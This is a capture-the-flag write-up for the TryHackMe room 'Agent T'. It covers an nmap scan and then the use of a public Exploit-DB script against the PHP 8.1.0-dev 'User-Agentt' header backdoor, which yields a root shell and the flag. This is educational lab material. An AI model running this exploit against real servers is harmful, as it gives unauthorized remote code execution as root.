<p align="center">
  THM : Agent T<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/oWDIySa.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Exploiting PHP 8.1.0-dev](#exploiting-php-810-dev)
- [Conclusion](#conclusion)

## Nmap scan

Let's start with an agressive [nmap](https://nmap.org/) scan against the target :  
```
# Nmap 7.80 scan initiated Mon Oct 24 12:38:20 2022 as: nmap -A -p- -oN nmapResults.txt 10.10.222.61
Nmap scan report for 10.10.222.61
Host is up (0.066s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 24 12:39:08 2022 -- 1 IP address (1 host up) scanned in 48.33 seconds
```

There is only one open port, where we can access a website (port 80). Also, we have the PHP version (8.1.0-dev).

## Website enumeration

Let's take a look at the website using a web browser :  
![](https://i.imgur.com/AMvGQgu.jpg)  

This is an admin dashboard. Almost all of the buttons in this dashboard are not working and everything seems to be just cosmetics.

## Exploiting PHP 8.1.0-dev

The only information we have that seems to be useful to exploit this webserver is the PHP version which is outdated. We can search for available exploits for this PHP 
version on [Exploit-DB](https://www.exploit-db.com/). If we search for "PHP 8.1.0-dev", there is only one result :  
![](https://i.imgur.com/RhUl47F.jpg)  

This exploit leads to a RCE (Remote Code Execution), we may be able to get a reverse shell using this exploit. Let's take a look at it :  
![](https://i.imgur.com/H0DVdY8.jpg)  

This exploit uses a backdoor present in this PHP version. The backdoor can be used by adding an HTTP header named `User-Agentt` containing a payload. Let's download 
this exploit and use it against the target :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_T$ python3 49933.py 
Enter the full host url:
http://10.10.222.61/ 

Interactive shell is opened on http://10.10.222.61/ 
Can't acces tty; job crontol turned off.
$ whoami
root

$
```

And we already have a shell as root ! Let's get the flag :  
```
$ ls /
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat /flag.txt
flag{******************************}
```

## Conclusion

This room was very easy. It shows how it can be dangerous if someone find a way to put malicious code in a program that many users will download. Thanks for this room ! And 
thanks for reading my write ups !
